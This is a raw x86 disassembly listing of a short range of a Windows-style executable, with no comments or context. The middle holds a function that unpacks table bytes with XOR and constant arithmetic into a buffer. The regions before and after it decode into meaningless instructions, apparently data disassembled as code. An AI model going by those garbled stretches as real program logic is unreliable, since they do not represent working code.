  417b00:	mov    esp,DWORD PTR [ebp+0x3000cc8d]
  417b06:	mov    DWORD PTR [eax],eax
  417b08:	pushf  
  417b09:	das    
  417b0a:	leave  
  417b0b:	add    bh,bh
  417b0d:	in     al,0x0
  417b0f:	call   DWORD PTR [eax-0x7c002acb]
  417b15:	mov    dh,0x0
  417b17:	jmp    FWORD PTR [ecx+0x79]
  417b1a:	fdivp  st(7),st
  417b1c:	int3   
  417b1d:	sub    edi,edi
  417b1f:	add    BYTE PTR [esi+edi*8],cl
  417b22:	loopne 0x417aa7
  417b24:	add    BYTE PTR [ebp-0x1],dh
  417b27:	and    DWORD PTR [edi+0x5],0xffffffc5
  417b2b:	inc    DWORD PTR [ebx-0x600ff14]
  417b31:	mov    ah,0xa2
  417b33:	inc    DWORD PTR [eax]
  417b35:	jg     0x417aba
  417b37:	xor    DWORD PTR [edx],0xffffffcf
  417b3a:	lock dec esp
  417b3d:	mov    ebx,0xa147ccff
  417b42:	cmp    al,0xff
  417b44:	jmp    DWORD PTR [ecx-0x7d]
  417b47:	dec    esp
  417b49:	int3   
  417b4a:	int3   
  417b4b:	int3   
  417b4c:	int3   
  417b4d:	int3   
  417b4e:	int3   
  417b4f:	int3   
  417b50:	add    BYTE PTR [eax-0x7cf3c100],dl
  417b56:	sar    edi,1
  417b58:	add    cl,dh
  417b5a:	inc    DWORD PTR [esi-0x367ccd]
  417b60:	int3   
  417b61:	mov    ch,0x0
  417b63:	and    eax,0xffcb0055
  417b68:	add    al,dh
  417b6a:	add    DWORD PTR [esi+0x230089],0xffffff81
  417b71:	in     al,dx
  417b72:	pop    esp
  417b73:	add    al,BYTE PTR [eax]
  417b75:	add    BYTE PTR [ebx+0x55],dl
  417b78:	push   esi
  417b79:	push   edi
  417b7a:	mov    eax,DWORD PTR [esp+0x270]
  417b81:	movzx  ecx,BYTE PTR [eax+0x6]
  417b85:	mov    edx,DWORD PTR ds:0x448d20
  417b8b:	shl    ecx,0x10
  417b8e:	movzx  esi,WORD PTR [eax+0x3]
  417b92:	add    ecx,esi
  417b94:	movzx  esi,BYTE PTR [eax+0x1]
  417b98:	shl    ecx,0x8
  417b9b:	add    ecx,esi
  417b9d:	mov    esi,DWORD PTR ds:0x448d1c
  417ba3:	mov    DWORD PTR ds:0x448d10,ecx
  417ba9:	add    esi,0x2385850a
  417baf:	xor    esi,ecx
  417bb1:	mov    DWORD PTR [edx],esi
  417bb3:	movzx  ecx,BYTE PTR [eax+0xe]
  417bb7:	movzx  esi,WORD PTR [eax+0xb]
  417bbb:	shl    ecx,0x10
  417bbe:	add    ecx,esi
  417bc0:	movzx  esi,BYTE PTR [eax+0x9]
  417bc4:	shl    ecx,0x8
  417bc7:	add    ecx,esi
  417bc9:	mov    esi,DWORD PTR ds:0x448d1c
  417bcf:	mov    DWORD PTR ds:0x448d10,ecx
  417bd5:	add    esi,0x2385850a
  417bdb:	xor    esi,ecx
  417bdd:	mov    DWORD PTR [edx+0x4],esi
  417be0:	movzx  ecx,BYTE PTR [eax+0x16]
  417be4:	movzx  esi,WORD PTR [eax+0x13]
  417be8:	shl    ecx,0x10
  417beb:	add    ecx,esi
  417bed:	movzx  esi,BYTE PTR [eax+0x11]
  417bf1:	shl    ecx,0x8
  417bf4:	add    ecx,esi
  417bf6:	mov    esi,DWORD PTR ds:0x448d1c
  417bfc:	mov    ebp,DWORD PTR ds:0x445028
  417c02:	mov    DWORD PTR ds:0x448d10,ecx
  417c08:	add    esi,0x2385850a
  417c0e:	xor    esi,ecx
  417c10:	mov    DWORD PTR [edx+0x8],esi
  417c13:	movzx  ecx,BYTE PTR [eax+0x1e]
  417c17:	movzx  esi,WORD PTR [eax+0x1b]
  417c1b:	movzx  eax,BYTE PTR [eax+0x19]
  417c1f:	shl    ecx,0x10
  417c22:	add    ecx,esi
  417c24:	shl    ecx,0x8
  417c27:	add    ecx,eax
  417c29:	mov    eax,ds:0x448d1c
  417c2e:	add    eax,0x2385850a
  417c33:	xor    eax,ecx
  417c35:	mov    DWORD PTR ds:0x448d10,ecx
  417c3b:	mov    DWORD PTR [edx+0xc],eax
  417c3e:	mov    esi,DWORD PTR ds:0x448d20
  417c44:	add    esi,0x10
  417c47:	mov    edi,0x4
  417c4c:	lea    esp,[esp+0x0]
  417c50:	lea    ecx,[esp+0x10]
  417c54:	push   ecx
  417c55:	call   ebp
  417c57:	mov    ecx,DWORD PTR ds:0x44806c
  417c5d:	movzx  eax,BYTE PTR [ecx+0x7]
  417c61:	movzx  edx,WORD PTR [ecx+0x5]
  417c65:	movzx  ecx,BYTE PTR [ecx+0x3]
  417c69:	shl    eax,0x10
  417c6c:	add    eax,edx
  417c6e:	shl    eax,0x8
  417c71:	mov    edx,0xd4423f
  417c76:	sub    edx,DWORD PTR ds:0x448d1c
  417c7c:	add    eax,ecx
  417c7e:	xor    edx,eax
  417c80:	mov    ds:0x448d10,eax
  417c85:	mov    DWORD PTR [esi],edx
  417c87:	add    DWORD PTR ds:0x44806c,0x8
  417c8e:	add    esi,0x4
  417c91:	dec    edi
  417c92:	jne    0x417c50
  417c94:	mov    edx,DWORD PTR ds:0x448070
  417c9a:	movzx  ecx,BYTE PTR [edx+0x6]
  417c9e:	movzx  esi,WORD PTR [edx+0x3]
  417ca2:	movzx  edx,BYTE PTR [edx+0x1]
  417ca6:	mov    eax,ds:0x448d20
  417cab:	shl    ecx,0x10
  417cae:	add    ecx,esi
  417cb0:	shl    ecx,0x8
  417cb3:	add    ecx,edx
  417cb5:	mov    DWORD PTR ds:0x448d10,ecx
  417cbb:	mov    edx,0x707ae3ea
  417cc0:	sub    edx,DWORD PTR ds:0x448d1c
  417cc6:	mov    ebx,DWORD PTR ds:0x44501c
  417ccc:	xor    edx,ecx
  417cce:	mov    DWORD PTR [eax+0x20],edx
  417cd1:	mov    edx,DWORD PTR ds:0x448070
  417cd7:	movzx  ecx,BYTE PTR [edx+0xf]
  417cdb:	movzx  esi,BYTE PTR [edx+0xd]
  417cdf:	movzx  edx,WORD PTR [edx+0x9]
  417ce3:	shl    ecx,0x8
  417ce6:	add    ecx,esi
  417ce8:	shl    ecx,0x10
  417ceb:	add    ecx,edx
  417ced:	mov    DWORD PTR ds:0x448d10,ecx
  417cf3:	mov    edx,0x707ae3ea
  417cf8:	sub    edx,DWORD PTR ds:0x448d1c
  417cfe:	mov    edi,0x2
  417d03:	xor    edx,ecx
  417d05:	mov    DWORD PTR [eax+0x24],edx
  417d08:	mov    edx,DWORD PTR ds:0x448070
  417d0e:	add    edx,0x10
  417d11:	mov    DWORD PTR ds:0x448070,edx
  417d17:	movzx  ecx,BYTE PTR [edx+0x6]
  417d1b:	movzx  esi,WORD PTR [edx+0x3]
  417d1f:	movzx  edx,BYTE PTR [edx+0x1]
  417d23:	shl    ecx,0x10
  417d26:	add    ecx,esi
  417d28:	shl    ecx,0x8
  417d2b:	add    ecx,edx
  417d2d:	mov    DWORD PTR ds:0x448d10,ecx
  417d33:	mov    edx,0x707ae3ea
  417d38:	sub    edx,DWORD PTR ds:0x448d1c
  417d3e:	xor    edx,ecx
  417d40:	mov    DWORD PTR [eax+0x28],edx
  417d43:	mov    edx,DWORD PTR ds:0x448070
  417d49:	movzx  ecx,BYTE PTR [edx+0xf]
  417d4d:	movzx  esi,BYTE PTR [edx+0xd]
  417d51:	movzx  edx,WORD PTR [edx+0x9]
  417d55:	shl    ecx,0x8
  417d58:	add    ecx,esi
  417d5a:	shl    ecx,0x10
  417d5d:	add    ecx,edx
  417d5f:	mov    edx,0x707ae3ea
  417d64:	sub    edx,DWORD PTR ds:0x448d1c
  417d6a:	mov    DWORD PTR ds:0x448d10,ecx
  417d70:	xor    edx,ecx
  417d72:	mov    DWORD PTR [eax+0x2c],edx
  417d75:	mov    esi,DWORD PTR ds:0x448d20
  417d7b:	add    DWORD PTR ds:0x448070,0x10
  417d82:	add    esi,0x30
  417d85:	lea    eax,[esp+0x34]
  417d89:	push   eax
  417d8a:	push   0x0
  417d8c:	push   0x3
  417d8e:	call   ebx
  417d90:	mov    ecx,DWORD PTR ds:0x448074
  417d96:	mov    eax,DWORD PTR [ecx+0x1]
  417d99:	mov    edx,DWORD PTR ds:0x448d1c
  417d9f:	mov    ds:0x448d10,eax
  417da4:	add    edx,0x1cfe6728
  417daa:	xor    edx,eax
  417dac:	mov    DWORD PTR [esi],edx
  417dae:	mov    ecx,DWORD PTR ds:0x448074
  417db4:	movzx  eax,BYTE PTR [ecx+0xb]
  417db8:	movzx  edx,BYTE PTR [ecx+0x8]
  417dbc:	movzx  ecx,WORD PTR [ecx+0x6]
  417dc0:	shl    eax,0x8
  417dc3:	add    eax,edx
  417dc5:	mov    edx,DWORD PTR ds:0x448d1c
  417dcb:	shl    eax,0x10
  417dce:	add    eax,ecx
  417dd0:	add    edx,0x1cfe6728
  417dd6:	xor    edx,eax
  417dd8:	mov    ds:0x448d10,eax
  417ddd:	mov    DWORD PTR [esi+0x4],edx
  417de0:	add    DWORD PTR ds:0x448074,0x10
  417de7:	add    esi,0x8
  417dea:	dec    edi
  417deb:	jne    0x417d85
  417ded:	mov    edx,DWORD PTR ds:0x448078
  417df3:	movzx  eax,BYTE PTR [edx+0x4]
  417df7:	movzx  esi,BYTE PTR [edx+0x2]
  417dfb:	movzx  edx,WORD PTR [edx]
  417dfe:	mov    ecx,DWORD PTR ds:0x448d20
  417e04:	shl    eax,0x8
  417e07:	add    eax,esi
  417e09:	shl    eax,0x10
  417e0c:	add    eax,edx
  417e0e:	mov    ds:0x448d10,eax
  417e13:	mov    edx,0xffedd0f4
  417e18:	sub    edx,DWORD PTR ds:0x448d1c
  417e1e:	mov    edi,0x8
  417e23:	xor    edx,eax
  417e25:	mov    DWORD PTR [ecx+0x40],edx
  417e28:	mov    edx,DWORD PTR ds:0x448078
  417e2e:	add    edx,edi
  417e30:	mov    DWORD PTR ds:0x448078,edx
  417e36:	movzx  eax,BYTE PTR [edx+0x4]
  417e3a:	movzx  esi,BYTE PTR [edx+0x2]
  417e3e:	movzx  edx,WORD PTR [edx]
  417e41:	shl    eax,0x8
  417e44:	add    eax,esi
  417e46:	shl    eax,0x10
  417e49:	add    eax,edx
  417e4b:	mov    ds:0x448d10,eax
  417e50:	mov    edx,0xffedd0f4
  417e55:	sub    edx,DWORD PTR ds:0x448d1c
  417e5b:	xor    edx,eax
  417e5d:	mov    DWORD PTR [ecx+0x44],edx
  417e60:	mov    edx,DWORD PTR ds:0x448078
  417e66:	add    edx,edi
  417e68:	mov    DWORD PTR ds:0x448078,edx
  417e6e:	movzx  eax,BYTE PTR [edx+0x4]
  417e72:	movzx  esi,BYTE PTR [edx+0x2]
  417e76:	movzx  edx,WORD PTR [edx]
  417e79:	shl    eax,0x8
  417e7c:	add    eax,esi
  417e7e:	shl    eax,0x10
  417e81:	add    eax,edx
  417e83:	mov    ds:0x448d10,eax
  417e88:	mov    edx,0xffedd0f4
  417e8d:	sub    edx,DWORD PTR ds:0x448d1c
  417e93:	xor    edx,eax
  417e95:	mov    DWORD PTR [ecx+0x48],edx
  417e98:	mov    edx,DWORD PTR ds:0x448078
  417e9e:	add    edx,edi
  417ea0:	mov    DWORD PTR ds:0x448078,edx
  417ea6:	movzx  eax,BYTE PTR [edx+0x4]
  417eaa:	movzx  esi,BYTE PTR [edx+0x2]
  417eae:	movzx  edx,WORD PTR [edx]
  417eb1:	shl    eax,0x8
  417eb4:	add    eax,esi
  417eb6:	shl    eax,0x10
  417eb9:	add    eax,edx
  417ebb:	mov    edx,0xffedd0f4
  417ec0:	sub    edx,DWORD PTR ds:0x448d1c
  417ec6:	mov    ds:0x448d10,eax
  417ecb:	xor    edx,eax
  417ecd:	mov    DWORD PTR [ecx+0x4c],edx
  417ed0:	add    DWORD PTR ds:0x448078,edi
  417ed6:	call   DWORD PTR ds:0x445010
  417edc:	mov    esi,DWORD PTR ds:0x448d20
  417ee2:	lea    eax,[esp+0x10]
  417ee6:	push   eax
  417ee7:	call   ebp
  417ee9:	mov    ecx,DWORD PTR ds:0x44807c
  417eef:	movzx  eax,WORD PTR [ecx+0x6]
  417ef3:	movzx  ecx,WORD PTR [ecx+0x3]
  417ef7:	mov    edx,DWORD PTR ds:0x448d1c
  417efd:	shl    eax,0x10
  417f00:	add    eax,ecx
  417f02:	xor    edx,eax
  417f04:	mov    ds:0x448d10,eax
  417f09:	xor    edx,0xfff44789
  417f0f:	mov    DWORD PTR [esi+0x50],edx
  417f12:	mov    ecx,DWORD PTR ds:0x44807c
  417f18:	add    ecx,edi
  417f1a:	mov    DWORD PTR ds:0x44807c,ecx
  417f20:	movzx  eax,WORD PTR [ecx+0x6]
  417f24:	shl    eax,0x10
  417f27:	movzx  ecx,WORD PTR [ecx+0x3]
  417f2b:	mov    edx,DWORD PTR ds:0x448d1c
  417f31:	add    eax,ecx
  417f33:	xor    edx,eax
  417f35:	mov    ds:0x448d10,eax
  417f3a:	xor    edx,0xfff44789
  417f40:	mov    DWORD PTR [esi+0x54],edx
  417f43:	mov    ecx,DWORD PTR ds:0x44807c
  417f49:	mov    edx,DWORD PTR ds:0x448d1c
  417f4f:	add    ecx,edi
  417f51:	mov    DWORD PTR ds:0x44807c,ecx
  417f57:	movzx  eax,WORD PTR [ecx+0x6]
  417f5b:	movzx  ecx,WORD PTR [ecx+0x3]
  417f5f:	shl    eax,0x10
  417f62:	add    eax,ecx
  417f64:	xor    edx,eax
  417f66:	mov    ds:0x448d10,eax
  417f6b:	xor    edx,0xfff44789
  417f71:	mov    DWORD PTR [esi+0x58],edx
  417f74:	mov    ecx,DWORD PTR ds:0x44807c
  417f7a:	mov    edx,DWORD PTR ds:0x448d1c
  417f80:	add    ecx,edi
  417f82:	mov    DWORD PTR ds:0x44807c,ecx
  417f88:	movzx  eax,WORD PTR [ecx+0x6]
  417f8c:	movzx  ecx,WORD PTR [ecx+0x3]
  417f90:	shl    eax,0x10
  417f93:	add    eax,ecx
  417f95:	xor    edx,eax
  417f97:	xor    edx,0xfff44789
  417f9d:	mov    ds:0x448d10,eax
  417fa2:	mov    DWORD PTR [esi+0x5c],edx
  417fa5:	add    DWORD PTR ds:0x44807c,edi
  417fab:	mov    esi,DWORD PTR ds:0x448d20
  417fb1:	mov    ecx,DWORD PTR ds:0x448080
  417fb7:	add    esi,0x60
  417fba:	mov    edi,0x109
  417fbf:	nop
  417fc0:	movzx  eax,BYTE PTR [ecx+0x5]
  417fc4:	movzx  edx,BYTE PTR [ecx+0x3]
  417fc8:	movzx  ecx,WORD PTR [ecx+0x1]
  417fcc:	shl    eax,0x8
  417fcf:	add    eax,edx
  417fd1:	mov    edx,DWORD PTR ds:0x448d1c
  417fd7:	shl    eax,0x10
  417fda:	add    eax,ecx
  417fdc:	mov    ds:0x448d10,eax
  417fe1:	xor    edx,eax
  417fe3:	lea    eax,[esp+0x150]
  417fea:	push   eax
  417feb:	push   0x0
  417fed:	xor    edx,0x35812cf7
  417ff3:	push   0x3
  417ff5:	mov    DWORD PTR [esi],edx
  417ff7:	call   ebx
  417ff9:	mov    ecx,DWORD PTR ds:0x448080
  417fff:	movzx  eax,BYTE PTR [ecx+0xe]
  418003:	movzx  edx,BYTE PTR [ecx+0xc]
  418007:	movzx  ecx,WORD PTR [ecx+0x6]
  41800b:	shl    eax,0x8
  41800e:	add    eax,edx
  418010:	shl    eax,0x10
  418013:	add    eax,ecx
  418015:	mov    edx,0x35892ef7
  41801a:	sub    edx,DWORD PTR ds:0x448d1c
  418020:	mov    ds:0x448d10,eax
  418025:	xor    edx,eax
  418027:	mov    DWORD PTR [esi+0x4],edx
  41802a:	mov    ecx,DWORD PTR ds:0x448080
  418030:	add    ecx,0x10
  418033:	add    esi,0x8
  418036:	dec    edi
  418037:	mov    DWORD PTR ds:0x448080,ecx
  41803d:	jne    0x417fc0
  41803f:	mov    ebx,DWORD PTR ds:0x445024
  418045:	push   edi
  418046:	call   ebx
  418048:	mov    ecx,DWORD PTR ds:0x448080
  41804e:	movzx  eax,BYTE PTR [ecx+0x5]
  418052:	movzx  edx,BYTE PTR [ecx+0x3]
  418056:	movzx  ecx,WORD PTR [ecx+0x1]
  41805a:	shl    eax,0x8
  41805d:	add    eax,edx
  41805f:	shl    eax,0x10
  418062:	add    eax,ecx
  418064:	mov    edx,0x35892ef7
  418069:	sub    edx,DWORD PTR ds:0x448d1c
  41806f:	mov    ds:0x448d10,eax
  418074:	xor    edx,eax
  418076:	mov    DWORD PTR [esi],edx
  418078:	mov    esi,DWORD PTR ds:0x448d20
  41807e:	mov    ecx,DWORD PTR ds:0x448084
  418084:	add    esi,0x8ac
  41808a:	mov    edi,0x16b
  41808f:	nop
  418090:	movzx  eax,WORD PTR [ecx+0x7]
  418094:	movzx  edx,BYTE PTR [ecx+0x5]
  418098:	movzx  ecx,BYTE PTR [ecx]
  41809b:	shl    eax,0x8
  41809e:	add    eax,edx
  4180a0:	shl    eax,0x8
  4180a3:	mov    edx,0x19885128
  4180a8:	sub    edx,DWORD PTR ds:0x448d1c
  4180ae:	add    eax,ecx
  4180b0:	xor    edx,eax
  4180b2:	mov    ds:0x448d10,eax
  4180b7:	push   0x0
  4180b9:	mov    DWORD PTR [esi],edx
  4180bb:	call   ebx
  4180bd:	mov    ecx,DWORD PTR ds:0x448084
  4180c3:	movzx  eax,BYTE PTR [ecx+0xf]
  4180c7:	movzx  edx,BYTE PTR [ecx+0xb]
  4180cb:	movzx  ecx,WORD PTR [ecx+0x9]
  4180cf:	shl    eax,0x8
  4180d2:	add    eax,edx
  4180d4:	mov    edx,DWORD PTR ds:0x448d1c
  4180da:	shl    eax,0x10
  4180dd:	add    eax,ecx
  4180df:	add    edx,0x19804d5c
  4180e5:	xor    edx,eax
  4180e7:	mov    ds:0x448d10,eax
  4180ec:	mov    DWORD PTR [esi+0x4],edx
  4180ef:	mov    ecx,DWORD PTR ds:0x448084
  4180f5:	add    ecx,0x10
  4180f8:	add    esi,0x8
  4180fb:	dec    edi
  4180fc:	mov    DWORD PTR ds:0x448084,ecx
  418102:	jne    0x418090
  418104:	movzx  eax,WORD PTR [ecx+0x7]
  418108:	movzx  edx,BYTE PTR [ecx+0x5]
  41810c:	movzx  ecx,BYTE PTR [ecx]
  41810f:	shl    eax,0x8
  418112:	add    eax,edx
  418114:	mov    edx,DWORD PTR ds:0x448d1c
  41811a:	shl    eax,0x8
  41811d:	add    eax,ecx
  41811f:	add    edx,0x19804d5c
  418125:	pop    edi
  418126:	xor    edx,eax
  418128:	mov    ds:0x448d10,eax
  41812d:	mov    DWORD PTR [esi],edx
  41812f:	pop    esi
  418130:	pop    ebp
  418131:	pop    ebx
  418132:	add    esp,0x25c
  418138:	ret    
  418139:	int3   
  41813a:	int3   
  41813b:	int3   
  41813c:	int3   
  41813d:	int3   
  41813e:	int3   
  41813f:	int3   
  418140:	dec    ecx
  418141:	add    bh,bh
  418143:	ret    0x891c
  418146:	dec    esp
  418148:	jnp    0x418149
  41814a:	push   eax
  41814b:	call   DWORD PTR [edi]
  41814d:	mov    dl,0x48
  41814f:	(bad)  
  418150:	jle    0x4180d5
  418152:	call   FWORD PTR [esi+0x4b]
  418155:	add    BYTE PTR [eax],al
  418157:	dec    ecx
  418159:	add    BYTE PTR [esi],cl
  41815b:	adc    DWORD PTR [edx-0x4],0xffffffe7
  41815f:	sub    DWORD PTR [ecx-0x242a7c01],0x0
  418166:	(bad)  
  418167:	(bad)  
  418168:	jmp    0x81c51d6c
  41816d:	xor    BYTE PTR [eax+0x0],al
  418170:	add    DWORD PTR [eax],0xdb8d83
  418176:	dec    esp
  418178:	imul   eax,DWORD PTR [ebx+0x39918338],0x83c30098
  418182:	add    BYTE PTR [ebp+eax*1-0x1],ch
  418186:	int3   
  418187:	push   DWORD PTR [ebp+0x1fff05ff]
  41818d:	packuswb mm7,mm7
  418190:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418191:	add    DWORD PTR [eax],0xffffff8d
  418194:	adc    eax,0x5affffff
  418199:	(bad)  
  41819a:	jmp    0x7aff:0x12e86689
  4181a1:	add    BYTE PTR [ebx-0xffdd76],al
  4181a7:	mov    DWORD PTR [edx-0x45331c00],edi
  4181ad:	push   ss
  4181ae:	sbb    al,BYTE PTR [ebx-0x76760046]
  4181b4:	jnp    0x4181b5
  4181b6:	inc    DWORD PTR [ebx-0x76e8ff26]
  4181bc:	fscale 
  4181be:	fwait
  4181bf:	dec    DWORD PTR [ecx-0x450c0001]
  4181c5:	cmp    edi,0xffffffcc
  4181c8:	adc    al,0x83
  4181ca:	cmp    bh,bh
  4181cc:	aas    
  4181cd:	cmp    ah,BYTE PTR [edx+0x0]
  4181d0:	cs mov edi,edi
  4181d3:	mov    eax,ds:0xff43
  4181d8:	in     eax,dx
  4181d9:	jmp    DWORD PTR [edi+edi*8-0x76]
  4181dd:	dec    esp
  4181de:	mov    ah,0xff
  4181e0:	ret    0xcc83
  4181e3:	dec    eax
  4181e4:	and    bh,bh
  4181e6:	int3   
  4181e7:	add    DWORD PTR [edx-0x7d],0xffffffe6
  4181eb:	sub    DWORD PTR [esi-0x53336c92],0x0
  4181f2:	add    BYTE PTR [edx+0x57],dl
  4181f5:	(bad)  
  4181f6:	(bad)  
  4181f7:	inc    DWORD PTR [ebx-0x2c00c100]
  4181fd:	mov    ds:0xebffcf,eax
  418202:	(bad)  
  418203:	cmp    BYTE PTR ds:0x260000cc,ah
  418209:	inc    DWORD PTR [ebx-0x454ea701]
  41820f:	jmp    esi
  418211:	(bad)  
  418212:	(bad)  
  418213:	out    dx,eax
  418214:	js     0x418215
  418216:	inc    DWORD PTR [eax]
  418218:	add    bh,bh
  41821a:	jle    0x41821b
  41821c:	jne    0x418259
  41821e:	push   ebp
  41821f:	int3   
  418220:	xor    cl,BYTE PTR [ecx-0x487b01]
  418226:	inc    DWORD PTR [eax]
  418228:	enter  0x1aff,0xff
  41822c:	cli    
  41822d:	pop    esi
  41822e:	fwait
  41822f:	mov    edx,ebx
  418231:	add    bh,bh
  418233:	xchg   ebx,eax
  418234:	jno    0x4181b9
  418236:	dec    esp
  418238:	inc    edi
  418239:	call   FWORD PTR [eax-0x1da97f01]
  41823f:	add    BYTE PTR [eax-0x34],dh
  418242:	add    BYTE PTR [edx-0xff94],ah
  418248:	xchg   BYTE PTR [eax],al
  41824a:	(bad)  
  41824c:	dec    DWORD PTR [esi+0x2e]
  41824f:	mov    DWORD PTR [ebx+0x16b9ffff],eax
  418255:	int3   
  418256:	dec    esp
  418258:	push   ebp
  418259:	add    DWORD PTR [edx+0x53cc8eff],0x0
  418260:	jne    0x418262
  418262:	xor    DWORD PTR [ecx+ebx*4-0x4b767c34],0x0
  41826a:	mov    cl,0x0
  41826c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41826d:	mov    DWORD PTR [edi+0xffad00],0xff831bed
  418277:	push   DWORD PTR [eax+eax*1+0x3d]
  41827b:	sub    DWORD PTR [eax],0x68
  41827e:	mov    ds:0x838936ff,al
  418283:	cdq    
  418284:	out    0xff,al
  418286:	add    DWORD PTR [ebx-0x7c50ff22],0xffffff88
  41828d:	in     al,dx
  41828e:	dec    ecx
  41828f:	or     eax,0xffffff89
  418292:	dec    eax
  418294:	cmp    bh,0x83
  418297:	add    BYTE PTR [ecx-0x377c9700],dl
  41829d:	addr16 gs int3 
  4182a0:	and    bh,bh
  4182a2:	add    bl,ah
  4182a4:	push   cs
  4182a5:	inc    DWORD PTR [eax]
  4182a7:	int3   
  4182a8:	push   ss
  4182a9:	(bad)  
  4182aa:	fmul   st(4),st
  4182ac:	push   cs
  4182ad:	or     BYTE PTR [ecx],ah
  4182af:	int3   
  4182b0:	imul   edi,edi,0xffffffcc
  4182b3:	add    BYTE PTR [edi-0x4400ff34],ah
  4182b9:	call   FWORD PTR [ebx+0x0]
  4182bc:	or     edi,DWORD PTR [edx+0x3b]
  4182bf:	call   FWORD PTR [ebp-0x34]
  4182c2:	add    BYTE PTR [eax],dl
  4182c4:	lea    eax,[ebx-0x7c167c01]
  4182ca:	out    0x0,al
  4182cc:	sbb    BYTE PTR ds:0x67ff77,al
  4182d2:	add    BYTE PTR [eax],dh
  4182d4:	xchg   esi,eax
  4182d5:	int3   
  4182d6:	add    bh,bh
  4182d8:	cmp    DWORD PTR [ebx+0x6703892b],eax
  4182de:	add    BYTE PTR cs:[eax+0x371acc00],bh
  4182e5:	(bad)  
  4182e6:	inc    DWORD PTR [eax]
  4182e8:	pop    ecx
  4182e9:	call   DWORD PTR [edi+edi*8+0x52]
  4182ed:	je     0x418361
  4182ef:	add    DWORD PTR ds:0x27bfffff,0xffffff89
  4182f6:	add    bh,bh
  4182f8:	fcos   
  4182fa:	mov    eax,ds:0xf4bbe2ff
  4182ff:	add    bh,ah
  418301:	inc    DWORD PTR [ebx-0x7600f4d1]
  418307:	xor    DWORD PTR [edi],0xffffffcc
  41830a:	test   DWORD PTR [ecx-0xd74070],0x94ffffda
  418314:	cdq    
  418315:	(bad)  
  418316:	(bad)  
  418317:	(bad)  
  418318:	stc    
  418319:	call   DWORD PTR [ebx-0x77]
  41831c:	cld    
  41831d:	lea    ebp,[ebx-0x1]
  418320:	iret   
  418321:	add    bh,bh
  418323:	dec    eax
  418324:	xlat   BYTE PTR ds:[ebx]
  418325:	add    BYTE PTR [ebx+0x3e831900],al
  41832b:	add    BYTE PTR ds:0x76cc8f80,ch
  418331:	inc    DWORD PTR [eax]
  418333:	adc    cl,bh
  418335:	(bad)  
  418336:	dec    DWORD PTR [ecx-0xb200bf]
  41833c:	ret    0xb73b
  41833f:	call   DWORD PTR [esi+0x295900ff]
  418345:	(bad)  
  418346:	(bad)  
  418347:	dec    edi
  418349:	int3   
  41834a:	mov    edi,0x93e576ff
  41834f:	jmp    FWORD PTR ds:0xf0d9ccff
  418355:	(bad)  
  418356:	dec    esp
  418358:	scas   eax,DWORD PTR es:[edi]
  418359:	add    ch,dl
  41835b:	xor    edx,0x74
  41835e:	lea    eax,[eax]
  418360:	int    0xcc
  418362:	call   DWORD PTR [ecx-0x7c00ff79]
  418368:	enter  0xbc89,0xff
  41836c:	cli    
  41836d:	and    BYTE PTR [ebx+0x0],cl
  418370:	icebp  
  418371:	inc    DWORD PTR [ebx-0xff8ac6]
  418377:	mov    DWORD PTR [ecx],edi
  418379:	add    BYTE PTR [eax+0x37ccd000],ch
  41837f:	mov    DWORD PTR [edx+0x0],edx
  418382:	int3   
  418383:	data16 int 0x0
  418386:	add    BYTE PTR [ebx-0x7ca3004d],al
  41838c:	inc    ebx
  41838d:	xchg   ebp,eax
  41838e:	ins    DWORD PTR es:[edi],dx
  41838f:	add    BYTE PTR [ebx+eax*4],al
  418392:	jmp    DWORD PTR [edi]
  418394:	fisttp QWORD PTR [ecx-0x96ff34]
  41839a:	jmp    0x5389ac9e
  41839f:	call   FWORD PTR [edx+0x730989ff]
  4183a5:	or     DWORD PTR [ecx+0x22003a83],0xffffff89
  4183ac:	inc    esp
  4183ad:	nop
  4183ae:	das    
  4183af:	add    BYTE PTR [ebp-0x1],dl
  4183b2:	(bad)  
  4183b3:	mov    esp,0xccb4
  4183b8:	fcos   
  4183ba:	test   ah,0xa
  4183bd:	imul   edi,esp,0xffccf500
  4183c3:	mov    dh,BYTE PTR [edi-0x34]
  4183c6:	(bad)  
  4183c7:	jmp    FWORD PTR [ebx+0x4effc800]
  4183cd:	push   es
  4183ce:	mov    ch,0x0
  4183d0:	sbb    edi,edi
  4183d2:	add    BYTE PTR [edi+0xff00d3],bl
  4183d8:	ud0    esi,DWORD PTR [esi+0x232d9389]
  4183df:	(bad)  
  4183e0:	fld    QWORD PTR [eax]
  4183e2:	dec    DWORD PTR [esi]
  4183e4:	jp     0x4183e6
  4183e6:	(bad)  
  4183e7:	call   FWORD PTR [edx-0x6334434]
  4183ed:	mov    eax,ds:0xffc7ff30
  4183f2:	mov    DWORD PTR [edx+eax*2+0x0],edi
  4183f6:	add    BYTE PTR [ebx-0x70004b],al
  4183fc:	cmc    
  4183fd:	and    esi,esp
  4183ff:	add    BYTE PTR [esi-0x7f480001],cl
  418405:	inc    DWORD PTR [eax]
  418407:	int3   
  418408:	and    al,BYTE PTR [eax]
  41840a:	inc    edi
  41840b:	jmp    FWORD PTR [esi+0x4ffabd6]
  418411:	cmp    edi,0xffffffe7
  418414:	dec    edi
  418415:	add    BYTE PTR [eax],al
  418417:	add    BYTE PTR [ebx+eax*4-0x56520098],ch
  41841e:	cld    
  41841f:	sub    DWORD PTR [edx],0x0
  418422:	call   FWORD PTR [ebx-0xd0]
  418428:	push   eax
  418429:	cmp    esp,0x0
  41842c:	inc    edi
  41842d:	fadd   DWORD PTR [edi+edi*8]
  418430:	aam    0xff
  418432:	add    BYTE PTR [ebp+0x23],dh
  418435:	int3   
  418436:	add    bh,bh
  418438:	or     esp,ecx
  41843a:	inc    BYTE PTR [eax]
  41843c:	cld    
  41843d:	pusha  
  41843e:	sub    bh,bh
  418440:	test   bh,bh
  418442:	add    BYTE PTR [eax-0xff337c],ch
  418448:	hlt    
  418449:	add    BYTE PTR [edi],dl
  41844b:	add    bh,dh
  41844d:	repz push 0xffff9c00
  418453:	sbb    ecx,DWORD PTR [esi+0x0]
  418456:	dec    esp
  418458:	pop    ebx
  418459:	call   ecx
  41845b:	add    BYTE PTR [ecx-0x43ff5041],al
  418461:	(bad)  
  418462:	call   FWORD PTR [ebp-0x7c3300ba]
  418468:	add    bh,bh
  41846a:	fiadd  DWORD PTR [eax]
  41846c:	(bad)  
  41846d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41846e:	mov    bl,0x89
  418470:	xchg   BYTE PTR [eax],al
  418472:	jmp    DWORD PTR [eax]
  418474:	je     0x418475
  418476:	(bad)  
